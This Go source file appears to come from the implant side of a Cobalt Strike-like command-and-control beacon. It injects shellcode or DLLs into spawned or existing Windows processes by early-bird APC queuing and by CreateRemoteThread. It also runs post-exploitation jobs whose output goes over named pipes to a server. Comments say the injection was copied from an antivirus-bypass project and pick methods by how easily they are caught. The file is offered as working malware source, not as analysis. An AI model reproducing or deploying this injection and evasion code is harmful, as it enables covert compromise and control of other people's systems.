package command

import (
	"bytes"
	"errors"
	"fmt"
	"github.com/Microsoft/go-winio"
	"golang.org/x/sys/windows"
	"io"
	"main/config"
	"main/packet"
	"main/sysinfo"
	"strings"
	"time"
	"unsafe"
)

// use windows packet as much as possible
var (
	kernel32                = windows.NewLazySystemDLL("kernel32.dll")
	ntdll                   = windows.NewLazyDLL("ntdll.dll")
	advapi32                = windows.NewLazyDLL("Advapi32.dll")
	virtualAllocEx          = kernel32.NewProc("VirtualAllocEx")
	virtualProtectEx        = kernel32.NewProc("VirtualProtectEx")
	createRemoteThreadEx    = kernel32.NewProc("CreateRemoteThreadEx")
	queueUserAPC            = kernel32.NewProc("QueueUserAPC")
	terminateThread         = kernel32.NewProc("TerminateThread ")
	rtlCopyMemory           = ntdll.NewProc("RtlCopyMemory")
	createThread            = kernel32.NewProc("CreateThread")
	createProcessWithLogonW = advapi32.NewProc("CreateProcessWithLogonW")
	createProcessWithTokenW = advapi32.NewProc("CreateProcessWithTokenW")
	adjustTokenPrivileges   = advapi32.NewProc("AdjustTokenPrivileges")
	impersonateLoggedOnUser = advapi32.NewProc("ImpersonateLoggedOnUser")
	logonUserA              = advapi32.NewProc("LogonUserA")
)

type job struct {
	jid         int
	pid         uint32
	tid         uint32
	isJobSpawn  bool
	description string
	pipeName    string
	stopCh      chan bool
}

var jobs []job
var jobCnt = 0

// spawn and inject get thread/process id, but we need it in handleJob
var currentPid uint32 = 0
var currentTid uint32 = 0
var isJobSpawn = true

func removeJob(jid int) {
	for i, job := range jobs {
		if job.jid == jid {
			jobs = append(jobs[:i], jobs[i+1:]...)
		}
	}
}

// implement of beacon.Job

// inject command specify a pid to inject, so it seems no need to adjust whether it is x86 or x64
// TODO still didn't work
func InjectDll(b []byte) error {
	pid, dll, err := parseInject(b)
	processHandle, err := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, true, pid)
	if err != nil {
		// if you don't put a value into channel will cause blocking in handle job
		currentPid = 0
		return errors.New(fmt.Sprintf("OpenProcess error: %s", err))
	}
	currentPid = pid
	isJobSpawn = false
	//return createRemoteThread(processHandle, dll)

	// callUserAPC deploy
	threadIds := listThread(pid)
	threadHandle, err := windows.OpenThread(0, false, threadIds[0])
	if err != nil {
		// use currentPid = 0 to indicate error
		currentPid = 0
		return err
	}
	currentTid = threadIds[0]
	defer windows.CloseHandle(threadHandle)
	defer windows.CloseHandle(processHandle)
	return callUserAPC(processHandle, threadHandle, dll)
}

func listThread(pid uint32) []uint32 {
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, pid)
	if err != nil {
		return nil
	}
	defer windows.CloseHandle(snapshot)
	var te windows.ThreadEntry32
	te.Size = uint32(unsafe.Sizeof(te))
	err = windows.Thread32First(snapshot, &te)
	var threadId []uint32
	for err != windows.ERROR_NO_MORE_FILES {
		if te.OwnerProcessID == pid {
			threadId = append(threadId, te.ThreadID)
			fmt.Println(te.ThreadID)
		}
		err = windows.Thread32Next(snapshot, &te)
	}
	return threadId
}

// you should ensure x86 shellcode inject to x86 process
func getSpawnProcessX86() (string, string) {
	var arr []string
	if sysinfo.IsProcessX64() {
		path := config.SpawnToX86
		arr = strings.SplitN(path, " ", 2)
	} else {
		path := strings.Replace(config.SpawnToX86, "syswow64", "system32", 1)
		arr = strings.SplitN(path, " ", 2)
	}
	program := arr[0]
	args := ""
	if len(arr) > 1 {
		args = arr[1]
	}
	return program, args
}

func getSpawnProcessX64() (string, string) {
	var arr []string
	if sysinfo.IsProcessX64() {
		path := strings.Replace(config.SpawnToX64, "sysnative", "system32", 1)
		arr = strings.SplitN(path, " ", 2)
	} else {
		path := config.SpawnToX64
		arr = strings.SplitN(path, " ", 2)
	}
	program := arr[0]
	args := ""
	if len(arr) > 1 {
		args = arr[1]
	}
	return program, args
}

func SpawnAndInjectDllX64(dll []byte) error {
	program, args := getSpawnProcessX64()
	err := spawnAndInjectDll(dll, program, args)
	if err != nil {
		return err
	}
	return nil
}

func SpawnAndInjectDllX86(dll []byte) error {
	program, args := getSpawnProcessX86()
	err := spawnAndInjectDll(dll, program, args)
	if err != nil {
		return err
	}
	return nil
}

func spawnAndInjectDll(dll []byte, program string, args string) error {
	procInfo := &windows.ProcessInformation{}
	startupInfo := &windows.StartupInfo{
		Flags:      windows.STARTF_USESTDHANDLES | windows.CREATE_SUSPENDED,
		ShowWindow: 1,
	}
	errCreateProcess := createProcessNative(windows.StringToUTF16Ptr(program), windows.StringToUTF16Ptr(args), nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, startupInfo, procInfo)
	if errCreateProcess != nil && errCreateProcess != windows.SEVERITY_SUCCESS {
		currentPid = 0
		return errors.New(fmt.Sprintf("[!]Error calling CreateProcess:\r\n%s", errCreateProcess.Error()))
	}
	currentPid = procInfo.ProcessId
	// kill spawn will kill process, so threadId is useless
	currentTid = procInfo.ThreadId
	isJobSpawn = true
	defer windows.CloseHandle(procInfo.Process)
	defer windows.CloseHandle(procInfo.Thread)
	return callUserAPC(procInfo.Process, procInfo.Thread, dll)

	// createRemoteThread can be easily caught, you should never use it
	//processHandle, _ := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, true, procInfo.ProcessId)
	//return createRemoteThread(processHandle, dll)
}

// copy from GolangBypassAV EarlyBird
func callUserAPC(processHandle windows.Handle, threadHandle windows.Handle, shellcode []byte) error {
	addr, _, errVirtualAlloc := virtualAllocEx.Call(uintptr(processHandle), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

	if errVirtualAlloc != nil && errVirtualAlloc != windows.SEVERITY_SUCCESS {
		return errors.New(fmt.Sprintf("VirtualAlloc error: %s", errVirtualAlloc))
	}
	var length uintptr
	errWriteProcessMemory := windows.WriteProcessMemory(processHandle, addr, &shellcode[0], uintptr(len(shellcode)), &length)
	if errWriteProcessMemory != nil {
		return errors.New(fmt.Sprintf("WriteProcessMemory error: %s", errWriteProcessMemory))
	}
	oldProtect := windows.PAGE_READWRITE
	_, _, errVirtualProtectEx := virtualProtectEx.Call(uintptr(processHandle), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtectEx != nil && errVirtualProtectEx != windows.SEVERITY_SUCCESS {
		return errors.New(fmt.Sprintf("VirtualProtectEx error: %s", errVirtualProtectEx))
	}
	_, _, err := queueUserAPC.Call(addr, uintptr(threadHandle), 0)
	if err != nil && errVirtualProtectEx != windows.SEVERITY_SUCCESS {
		return errors.New(fmt.Sprintf("QueueUserAPC error: %s", err))
	}
	_, errResumeThread := windows.ResumeThread(threadHandle)
	if errResumeThread != nil {
		return errors.New(fmt.Sprintf("ResumeThread error: %s", errResumeThread))
	}
	return nil
}

func createRemoteThread(processHandle windows.Handle, shellcode []byte) error {
	addr, _, errVirtualAlloc := virtualAllocEx.Call(uintptr(processHandle), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

	if errVirtualAlloc != nil && errVirtualAlloc != windows.SEVERITY_SUCCESS {
		return errors.New(fmt.Sprintf("VirtualAllocEx error: %s", errVirtualAlloc))
	}

	if addr == 0 {
		return errors.New("[!]VirtualAllocEx failed and returned 0")
	}
	var writtenBytes uintptr
	errWriteProcessMemory := windows.WriteProcessMemory(processHandle, addr, &shellcode[0], uintptr(len(shellcode)), &writtenBytes)

	if errWriteProcessMemory != nil && errWriteProcessMemory != windows.SEVERITY_SUCCESS {
		return errors.New(fmt.Sprintf("[!]Error calling WriteProcessMemory: %s", errWriteProcessMemory))
	}

	oldProtect := windows.PAGE_READWRITE
	_, _, errVirtualProtectEx := virtualProtectEx.Call(uintptr(processHandle), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtectEx != nil && errVirtualProtectEx != windows.SEVERITY_SUCCESS {
		return errors.New(fmt.Sprintf("Error calling VirtualProtectEx: %s", errVirtualProtectEx))
	}
	var threadId uint32
	_, _, errCreateRemoteThreadEx := createRemoteThreadEx.Call(uintptr(processHandle), 0, 0, addr, 0, 0, uintptr(threadId))
	if errCreateRemoteThreadEx != nil && errCreateRemoteThreadEx != windows.SEVERITY_SUCCESS {
		return errors.New(fmt.Sprintf("[!]Error calling CreateRemoteThreadEx: %s", errCreateRemoteThreadEx))
	}
	currentTid = threadId
	_ = windows.CloseHandle(processHandle)
	return nil
}

func HandlerJobAsync(b []byte) error {
	buf := bytes.NewBuffer(b)
	// inject it gives pid, spawn it gives zero
	pidByte := make([]byte, 4)
	callbackTypeByte := make([]byte, 2)
	sleepTimeByte := make([]byte, 2)
	_, _ = buf.Read(pidByte)
	_, _ = buf.Read(callbackTypeByte)
	_, _ = buf.Read(sleepTimeByte)
	callbackType := packet.ReadShort(callbackTypeByte)
	sleepTime := packet.ReadShort(sleepTimeByte)
	pipeName, _ := parseAnArg(buf)
	commandType, _ := parseAnArg(buf)
	if currentPid == 0 {
		return nil
	}
	stopCh := make(chan bool, 1)
	j := job{
		jid:         jobCnt,
		pid:         currentPid,
		tid:         currentTid,
		description: string(commandType),
		pipeName:    string(pipeName),
		stopCh:      stopCh,
		isJobSpawn:  isJobSpawn,
	}
	jobCnt++
	jobs = append(jobs, j)

	// change it async
	go func() {
		// sleep time some time is small, some time is huge, so set it to Microsecond
		//fmt.Printf("Sleep time: %d\n", sleepTime)
		if sleepTime < 10 {
			time.Sleep(time.Second * time.Duration(sleepTime))
		} else {
			time.Sleep(time.Microsecond * time.Duration(sleepTime))
		}
		result, err := readNamedPipe(j)
		if err != nil {
			ErrorMessage(err.Error())
			removeJob(j.jid)
			return
		}

		switch string(commandType) {
		case "take screenshot":
			// take screenshot will have 4 bytes to indicate the data length, but server doesn't deal with it
			result = result[4:]
		default:
		}
		finalPacket := packet.MakePacket(int(callbackType), []byte(result))
		packet.PushResult(finalPacket)
		removeJob(j.jid)
	}()
	return nil
}

func ListJobs() error {
	result := ""
	for _, job := range jobs {
		result += fmt.Sprintf("%d\t%d\t%s\n", job.jid, job.pid, job.description)
	}
	finalPacket := packet.MakePacket(CALLBACK_LIST_JOBS, []byte(result))
	packet.PushResult(finalPacket)
	return nil
}

func KillJob(b []byte) error {
	jid := packet.ReadShort(b)
	for _, j := range jobs {
		if j.jid == int(jid) {
			j.stopCh <- true
			if j.isJobSpawn {
				processHandle, err := windows.OpenProcess(windows.PROCESS_TERMINATE, false, j.pid)
				if err != nil {
					return err
				}
				err = windows.TerminateProcess(processHandle, 0)
				if err != nil {
					return err
				}
			} else {
				threadHandle, err := windows.OpenThread(windows.THREAD_TERMINATE, false, j.tid)
				if err != nil {
					return err
				}
				_, _, err = terminateThread.Call(uintptr(unsafe.Pointer(&threadHandle)), 0)
				if err != nil {
					return err
				}
			}
		}
	}
	return nil
}

func readNamedPipe(j job) (string, error) {
	pipe, err := winio.DialPipe(j.pipeName, nil)
	if err != nil {
		// try it twice in case of sleep time is too short
		pipe, err = winio.DialPipe(j.pipeName, nil)
		if err != nil {
			return "", errors.New(fmt.Sprintf("DialPipe error: %s", err))
		}
	}
	defer pipe.Close()
	result := ""
	buf := make([]byte, 512)
	for {
		select {
		case <-j.stopCh:
			return "", errors.New(fmt.Sprintf("job %d canceled", j.jid))
		default:
			n, err := pipe.Read(buf)
			// if you kill the process, pipe will be closed and there will receive an EOF
			if err != nil {
				if err != io.EOF && err != windows.ERROR_PIPE_NOT_CONNECTED {
					return "", err
				}
				return result, nil
			}
			result += string(buf[:n])
		}
	}
}
